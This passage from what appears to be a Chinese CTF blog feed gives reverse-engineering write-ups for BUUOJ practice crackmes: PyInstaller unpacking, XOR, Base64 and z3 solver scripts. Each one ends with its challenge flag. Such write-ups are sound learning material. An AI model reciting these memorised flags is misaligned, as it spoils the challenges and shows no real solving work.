      <url>2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="下载-pyinstxtractor-py"><a href="#下载-pyinstxtractor-py" class="headerlink" title="下载 pyinstxtractor.py"></a>下载 pyinstxtractor.py</h1><a id="more"></a><p>地址：<a href="https://buuoj.cn/challenges#[HDCTF2019]Maze">https://sourceforge.net/projects/pyinstallerextractor/</a></p><h1 id="把pyinstxtractor-py和exe文件放在同个目录下"><a href="#把pyinstxtractor-py和exe文件放在同个目录下" class="headerlink" title="把pyinstxtractor.py和exe文件放在同个目录下"></a>把pyinstxtractor.py和exe文件放在同个目录下</h1><p>打开cmd，进入该目录，输入：</p><blockquote><p>python pyinstxtractor.py xx.exe</p></blockquote><p>运行后生成xx.exe_extracted文件夹。</p><p><img src="/2021/04/11/%E5%B0%86python%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F%E6%88%90-py%E6%96%87%E4%BB%B6/1.PNG"></p><p>找到 Possible entry point 后的文件，在其前面加上pyc文件头</p><blockquote><p>420d 0d0a 0000 0000 0da9 1b60 a809 0000</p></blockquote><p>添加文件头可以使用010 Editor或Sublime Text 3等等。<br>原博客地址: <a href="https://blog.csdn.net/tymatlab/article/details/80511709">https://blog.csdn.net/tymatlab/article/details/80511709</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录2</title>
      <link href="2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[HDCTF2019]Maze">题目链接</a><br>查看文件信息，有upx壳，脱去。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/1.PNG"></p><p>由字符串找到关键函数</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/2.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/3.PNG"></p><p>有一个花指令和没有声明的main函数，去掉花指令，在建立main函数即可。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/4.PNG"></p><p>转为数据，再将 0E8h nop掉，在转换回代码，然后识别main函数。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/5.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/6.PNG"></p><p>这之后就简单了，根据题目名和一个很明显的迷宫字符串，可知这是迷宫题。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/7.PNG"></p><p>重+走到F就行了</p><blockquote><p>flag{ssaaasaassdddw}</p></blockquote><h1 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h1><p><a href="https://buuoj.cn/challenges#[MRCTF2020]Xor">题目链接</a><br>查看文件信息, 32位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/8.PNG"></p><p>找到关键函数，f5反编译</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/9.PNG"></p><p>转为文本模式，找到那个地址，点进去，转为数据，再转为代码，就可以f5了。</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/10.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/11.PNG"></p><p>一个简单的异或<br>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char flag[27]&#x3D;&quot;MSAWB~FXZ:J:&#96;tQJ\&quot;N@ bpdd&#125;8g&quot;;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;27;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^&#x3D;i;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;flag&#123;@_R3@1ly_E2_R3verse!&#125;</span><br></pre></td></tr></table></figure><h1 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h1><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easyre">题目链接</a><br>查看文件信息, 64位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/12.PNG"></p><p>进入main函数里，有三个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/13.PNG"></p><p>第一个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/14.PNG"></p><p>一个正常的base64加密</p><p>第二个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/15.PNG"></p><p>第三个加密</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/16.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/17.PNG"></p><p>下面那个为加密二，上面的是加密三，加密三其实就是个变形的凯撒。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">char str[52]&#x3D;&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3&#x3D;cT6QckkPckoRG&quot;;</span><br><span class="line">char table[65]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char padding_char&#x3D;&#39;&#x3D;&#39;;</span><br><span class="line"></span><br><span class="line">void encode_three(char *a, int b)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">for ( i &#x3D; 0; i &lt; b; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a[i] &lt;&#x3D; 64 || a[i] &gt; 90 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( a[i] &lt;&#x3D; 96 || a[i] &gt; 122 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( a[i] &lt;&#x3D; 47 || a[i] &gt; 57 )</span><br><span class="line">         a[i] &#x3D; a[i];</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] -&#x3D; 3;</span><br><span class="line">        if(a[i]&lt;47)</span><br><span class="line">        a[i]+&#x3D;10;</span><br><span class="line">        if(a[i]&gt;57)</span><br><span class="line">        a[i]-&#x3D;10;</span><br><span class="line">&#125;</span><br><span class="line">          </span><br><span class="line">     &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        a[i] -&#x3D; 3;</span><br><span class="line">        if(a[i]&lt;97)</span><br><span class="line">        a[i]+&#x3D;26;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      a[i] -&#x3D; 3;</span><br><span class="line">      if(a[i]&lt;65)</span><br><span class="line">        a[i]+&#x3D;26;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void encode_two(char *a, char *b)</span><br><span class="line">&#123;</span><br><span class="line">strncpy(b+26,a,13);</span><br><span class="line">strncpy(b,a+13,13);</span><br><span class="line">strncpy(b+39,a+26,13);</span><br><span class="line">strncpy(b+13,a+39,13);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int findchr(char *array,char ch)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(array);i++)</span><br><span class="line">&#123;</span><br><span class="line">        if(array[i]&#x3D;&#x3D;ch)&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void base64_decode(char *src,char *result)</span><br><span class="line">&#123;</span><br><span class="line">    int base_len;</span><br><span class="line">    int i,j&#x3D;0;</span><br><span class="line">    base_len&#x3D;strlen(src);</span><br><span class="line">    for(i&#x3D;0;i&lt;base_len;i++)</span><br><span class="line">&#123;</span><br><span class="line">        if(src[i]&#x3D;&#x3D;padding_char)</span><br><span class="line">            src[i]&#x3D;&#39;A&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;base_len;i+&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i])&lt;&lt;2)+(findchr(table,src[i+1])&gt;&gt;4);</span><br><span class="line">        result[j++]&#x3D;(findchr(table,src[i+1])&lt;&lt;4)+(findchr(table,src[i+2])&gt;&gt;2);</span><br><span class="line">        result[j++]&#x3D;((findchr(table,src[i+2])&amp;3)&lt;&lt;6)+(findchr(table,src[i+3]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line">char str3[100]&#x3D;&quot;&quot;;</span><br><span class="line">char str2[52]&#x3D;&quot;&quot;;</span><br><span class="line">encode_three(str, 52);</span><br><span class="line">encode_two(str, str2);</span><br><span class="line">base64_decode(str2, str3);</span><br><span class="line">printf(&quot;%s&quot;,str3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GWHT{672cc4778a38e80cb362987341133ea2}</p></blockquote><h1 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h1><p>查看文件信息, 64位文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/18.PNG"></p><p>进入main函数和加密函数</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/19.PNG"></p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/20.PNG"></p><p>只是改了一下密码表<br>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char b[]&#x3D;&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321&#x2F;+&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI&#x3D;&#x3D;&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后去在线解密</p><blockquote><p>flag{Special_Base64_By_Lich}</p></blockquote><h1 id="羊城杯-2020-login"><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h1><p>附件为py可执行文件，使用pyinstxtractor导出pyc文件</p><p><img src="/2021/04/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/21.PNG"></p><p>在login前加上pyc文件头，另存为login.pyc，即可反编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># visit http:&#x2F;&#x2F;tool.lu&#x2F;pyc&#x2F; for more information</span><br><span class="line">import sys</span><br><span class="line">input1 &#x3D; input(&#39;input something:&#39;)</span><br><span class="line">if len(input1) !&#x3D; 14:</span><br><span class="line">    print(&#39;Wrong length!&#39;)</span><br><span class="line">    sys.exit()</span><br><span class="line">code &#x3D; []</span><br><span class="line">for i in range(13):</span><br><span class="line">    code.append(ord(input1[i]) ^ ord(input1[i + 1]))</span><br><span class="line"></span><br><span class="line">code.append(ord(input1[13]))</span><br><span class="line">a1 &#x3D; code[2]</span><br><span class="line">a2 &#x3D; code[1]</span><br><span class="line">a3 &#x3D; code[0]</span><br><span class="line">a4 &#x3D; code[3]</span><br><span class="line">a5 &#x3D; code[4]</span><br><span class="line">a6 &#x3D; code[5]</span><br><span class="line">a7 &#x3D; code[6]</span><br><span class="line">a8 &#x3D; code[7]</span><br><span class="line">a9 &#x3D; code[9]</span><br><span class="line">a10 &#x3D; code[8]</span><br><span class="line">a11 &#x3D; code[10]</span><br><span class="line">a12 &#x3D; code[11]</span><br><span class="line">a13 &#x3D; code[12]</span><br><span class="line">a14 &#x3D; code[13]</span><br><span class="line">if ((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 &#x3D;&#x3D; 22748) &amp; ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 &#x3D;&#x3D; 7258) &amp; ((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 &#x3D;&#x3D; 26190) &amp; ((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 &#x3D;&#x3D; 37136) &amp; (((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 &#x3D;&#x3D; 27915) &amp; ((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 &#x3D;&#x3D; 17298) &amp; ((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 &#x3D;&#x3D; 19875) &amp; (((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 &#x3D;&#x3D; 22784) &amp; ((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 &#x3D;&#x3D; 9710) &amp; (((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 &#x3D;&#x3D; 13376) &amp; ((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 &#x3D;&#x3D; 24065) &amp; ((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 &#x3D;&#x3D; 27687) &amp; (((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 &#x3D;&#x3D; 29250) &amp; (((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 &#x3D;&#x3D; 15317):</span><br><span class="line">    print(&#39;flag is GWHT&#123;md5(your_input)&#125;&#39;)</span><br><span class="line">    print(&#39;Congratulations and have fun!&#39;)</span><br><span class="line">else:</span><br><span class="line">    print(&#39;Sorry,plz try again...&#39;)</span><br></pre></td></tr></table></figure><p>方程组+异或</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x&#x3D;Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14&#x3D;Ints(&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;)</span><br><span class="line">x.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 &#x3D;&#x3D; 22748)</span><br><span class="line">x.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 &#x3D;&#x3D; 7258)</span><br><span class="line">x.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 &#x3D;&#x3D; 26190)</span><br><span class="line">x.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * 128 - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 &#x3D;&#x3D; 37136)</span><br><span class="line">x.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 &#x3D;&#x3D; 27915)</span><br><span class="line">x.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 &#x3D;&#x3D; 17298)</span><br><span class="line">x.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 &#x3D;&#x3D; 19875)</span><br><span class="line">x.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 &#x3D;&#x3D; 22784)</span><br><span class="line">x.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 &#x3D;&#x3D; 9710)</span><br><span class="line">x.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 &#x3D;&#x3D; 13376)</span><br><span class="line">x.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 &#x3D;&#x3D; 24065)</span><br><span class="line">x.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 &#x3D;&#x3D; 27687)</span><br><span class="line">x.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 &#x3D;&#x3D; 29250)</span><br><span class="line">x.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 &#x3D;&#x3D; 15317)</span><br><span class="line">if x.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(x.model())</span><br><span class="line">    </span><br><span class="line">a&#x3D;[10,24,119,7,104,43,28,91,108,52,88,74,88,33]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(a)-2,-1,-1):</span><br><span class="line">    flag+&#x3D;chr(a[i]^a[i+1])</span><br><span class="line">    a[i]&#x3D;a[i]^a[i+1]</span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">flag +&#x3D; chr(33)</span><br><span class="line">import hashlib as hb</span><br><span class="line">print(&quot;flag&#123;&quot;+hb.md5(str(flag).encode()).hexdigest()+&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>flag{58964088b637e50d3a22b9510c1d1ef8}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V-N2020 公开赛</title>
      <link href="2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRe"><a href="#CSRe" class="headerlink" title="CSRe"></a>CSRe</h1><a id="more"></a><p>Exeinfo PE查看程序，为C#，而且被混淆。<br>de4dot去除混淆。</p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/1.png"></p><p>拖入dnSpy32位中。</p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/2.png"></p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/3.png"></p><p>然后去在线解密，第一个解出来为314159，第二个为return.</p><blockquote><p>flag{1415turn}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="2021/03/28/DASCTF/"/>
      <url>2021/03/28/DASCTF/</url>
      
